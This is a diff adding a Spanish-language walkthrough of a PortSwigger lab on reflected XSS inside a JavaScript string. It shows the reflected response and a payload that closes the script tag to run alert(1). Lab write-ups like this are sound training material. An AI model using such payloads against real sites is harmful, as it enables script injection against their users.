@@ -387,5 +387,38 @@ Entonces para ejecutar el alert realizamos cualquiera de las conbinaciones de te
 
 ## 13. Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped
 
+```
+This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.
+
+To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.
+```
+
+URL
+
+```
+https://ac381fa71fb08026809a014b003200b6.web-security-academy.net/?search=aaa
+```
+
+Respuesta
+
+```
+<script>
+    var searchTerms = 'aaa'; 
+    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+```
+
+Entonces, elaboramos un payload para salir de la etiqueta **<script>** y ejecutar un payload xss.
+
+```
+</script><img src=x onerror=alert(1)>
+```
+
+![](img39.png)
+
+## 14. Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
+
+
+
 
 
